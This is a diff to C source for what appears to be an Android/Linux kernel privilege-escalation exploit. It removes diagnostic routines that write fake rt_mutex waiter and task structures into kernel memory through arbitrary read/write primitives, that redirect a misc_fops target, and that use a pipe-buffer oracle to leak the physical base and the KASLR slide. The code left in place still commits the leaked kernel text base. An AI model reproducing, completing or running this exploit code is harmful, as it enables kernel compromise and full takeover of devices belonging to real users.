@@ -85,14 +85,7 @@ int slide_pselect_words_per_set(void) {
 }
 
 int slide_pselect_global_word(int waiter_word) {
-  static int shift = -1;
-  if (shift < 0) {
-    const char *arg = getenv("SLIDE_WORD_SHIFT");
-    shift = (arg && *arg) ? atoi(arg) : SLIDE_PSELECT_WORD_SHIFT;
-    pr_info("slide pselect word shift=%d (env=%s)\n", shift,
-            arg && *arg ? arg : "default");
-  }
-  return shift + waiter_word;
+  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
 }
 
 int slide_pselect_put_global_word(
@@ -716,13 +709,6 @@ static int slide_leak_physical_base(void) {
     return 0;
   }
   int gate_result = verify_p0_pipe_oracle_gate();
-  if (getenv("P0_ORACLE_GATE_DIAG")) {
-    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
-    if (gate_result != 0) {
-      slide_restore_physical_oracle();
-    }
-    return 0;
-  }
   if (gate_result == 0) {
     pr_warning("p0 physical pipe reclaim miss\n");
     return 0;
@@ -757,158 +743,6 @@ static int slide_leak_physical_base(void) {
   return slide_commit_stext(KIMAGE_TEXT_BASE + va_slide, "physical");
 }
 
-static void dump_p0_oracle_words(int fd, const char *phase,
-                                 uintptr_t address, size_t count) {
-  for (size_t index = 0; index < count; index++) {
-    uintptr_t current = address + index * sizeof(uint64_t);
-    uint64_t value = kernel_read64(fd, current);
-    pr_info("p0 diagnostic %s addr=%016zx value=%016llx\n",
-            phase, current, (unsigned long long)value);
-  }
-}
-
-static int p0_diag_write32(int fd, uintptr_t address, uint32_t value) {
-  return kernel_write_data(fd, address, &value, sizeof(value)) ==
-         (ssize_t)sizeof(value);
-}
-
-static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
-  return kernel_write_data(fd, address, &value, sizeof(value)) ==
-         (ssize_t)sizeof(value);
-}
-
-static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
-                                  uintptr_t parent, uintptr_t target,
-                                  uintptr_t task, uintptr_t lock) {
-  if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
-      !p0_diag_write64(fd, waiter + 0x08, 0) ||
-      !p0_diag_write64(fd, waiter + 0x10, 0)) {
-    return 0;
-  }
-#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
-  return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-                         parent) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
-                         0) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
-                         target) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
-#if COMPACT_RT_MUTEX_WAITER
-         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
-#endif
-         p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
-                         SLIDE_FAKE_WAITER_PRIO) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0)
-#if COMPACT_RT_MUTEX_WAITER
-         && p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0)
-#endif
-         ;
-#else
-  return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
-                         SLIDE_FAKE_WAITER_PRIO) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-                         parent) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
-                         0) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
-                         target) &&
-         p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
-                         SLIDE_FAKE_WAITER_PRIO) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
-         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0);
-#endif
-}
-
-static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
-  uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
-  uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
-  uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
-  uintptr_t parent = direct_to_page(payload_base);
-  uintptr_t target = data_addr(ASHMEM_MISC_FOPS);
-  // uintptr_t target = pipebuf_page_base +
-  //                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-  static const char marker[] = "RMG-P0-ORACLE-GATE";
-  uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
-  if (getenv("P0_ORACLE_READ_DIAG")) {
-    marker_address = payload_base;
-  }
-
-  if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
-          (ssize_t)(sizeof(marker) - 1) ||
-      !p0_diag_write32(fd, lock + 0x00, 0) ||
-      !p0_diag_write64(fd, lock + 0x08, waiter) ||
-      !p0_diag_write64(fd, lock + 0x10, waiter) ||
-      !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
-      !prepare_p0_diag_waiter(fd, waiter, parent, target, task, lock) ||
-      !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
-      !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
-      !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
-                       FAKE_TASK_PRIO) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
-      !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
-                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
-    return 0;
-  }
-
-  fake_task = task;
-  fake_lock = lock;
-  fake_w0 = waiter;
-  slide_oracle_parent = parent;
-  slide_oracle_target = target;
-  return 1;
-}
-
-int run_p0_pipe_oracle_diagnostic(int fd) {
-  uintptr_t fops_page_base = page_base;
-  if (!prepare_p0_pipe_oracle() ||
-      !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
-    pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
-             pipebuf_page_base, fops_page_base);
-    return 0;
-  }
-
-  uintptr_t target_start = slide_oracle_target - 0x20;
-  uintptr_t parent_start = slide_oracle_parent;
-  uint64_t original_target = kernel_read64(fd, slide_oracle_target);
-  pr_info("p0 diagnostic prepared pipe=%016zx source=%016zx parent=%016zx "
-          "target=%016zx original=%016llx\n",
-          pipebuf_page_base, fops_page_base, slide_oracle_parent,
-          slide_oracle_target, (unsigned long long)original_target);
-  dump_p0_oracle_words(fd, "target-before", target_start, 20);
-  dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
-  if (!slide_trigger_physical_state()) {
-    pr_error("p0 diagnostic gate trigger failed\n");
-    return 0;
-  }
-  dump_p0_oracle_words(fd, "target-after", target_start, 20);
-  dump_p0_oracle_words(fd, "parent-after", parent_start, 8);
-  uint64_t changed_target = kernel_read64(fd, slide_oracle_target);
-  if (getenv("P0_ORACLE_READ_DIAG")) {
-    int gate_ok = verify_p0_pipe_oracle_gate();
-    pr_info("p0 diagnostic pipe read gate=%d\n", gate_ok);
-    fflush(NULL);
-    for (;;) {
-      sleep(60);
-    }
-  }
-  int restore_ok = p0_diag_write64(fd, slide_oracle_target, original_target);
-  uint64_t restored_target = kernel_read64(fd, slide_oracle_target);
-  pr_info("p0 diagnostic gate complete expected=%016zx changed=%016llx "
-          "restore=%d restored=%016llx\n",
-          slide_oracle_parent, (unsigned long long)changed_target,
-          restore_ok, (unsigned long long)restored_target);
-  return restore_ok && restored_target == original_target;
-}
 #endif
 
 static int slide_commit_stext(uint64_t stext, const char *source) {
@@ -970,49 +804,6 @@ int slide_leak_kernel_base(void) {
     }
     pr_info("slide forced p0 offset=%08llx\n", value);
     int committed = slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
-    if (committed && getenv("P0_ORACLE_GATE_DIAG")) {
-      pr_info("slide forced offset gate diagnostic starting\n");
-      if (!prepare_p0_pipe_oracle()) {
-        pr_error("p0 gate diag pipe preparation failed\n");
-        return 0;
-      }
-      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-      if (!page_base) {
-        pr_error("p0 gate diag fops page preparation failed\n");
-        return 0;
-      }
-      /* Redirect slot 0 target from misc_fops to a pipe buffer page so
-         the FOPS-page trigger can be verified via the pipe oracle without
-         needing fake_fops/configfs.  This isolates trigger vs target. */
-      uintptr_t pipe_target = pipebuf_page_base +
-                              P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-      uintptr_t misc_fops_target = data_addr(ASHMEM_MISC_FOPS);
-      /* Test 1: override both parent and target to match SLIDE page values */
-      uintptr_t slide_parent = direct_to_page(page_base);
-      pr_info("p0 gate diag FOPS trigger -> pipe target=%016zx "
-              "(original misc_fops=%016zx)\n",
-              pipe_target, misc_fops_target);
-      pr_info("p0 gate diag parent override: fake_fops=%016zx -> "
-              "page_struct=%016zx\n",
-              (uintptr_t)fake_fops, slide_parent);
-      if (!select_slide_payload_index(0)) {
-        pr_error("p0 gate diag select_slide_payload_index failed\n");
-        return 0;
-      }
-      slide_oracle_parent = slide_parent;
-      slide_oracle_target = pipe_target;
-      pr_info("p0 gate diag running fops slide route parent=%016zx "
-              "target=%016zx lock=%016zx\n",
-              slide_oracle_parent, slide_oracle_target, fake_lock);
-      int triggered = slide_trigger_physical_state();
-      int gate_result = verify_p0_pipe_oracle_gate();
-      pr_info("p0 gate diag FOPS trigger result=%d triggered=%d\n",
-              gate_result, triggered);
-      if (gate_result != 0) {
-        slide_restore_physical_oracle();
-      }
-      return 0;
-    }
     return committed;
   }
   return slide_leak_physical_base();
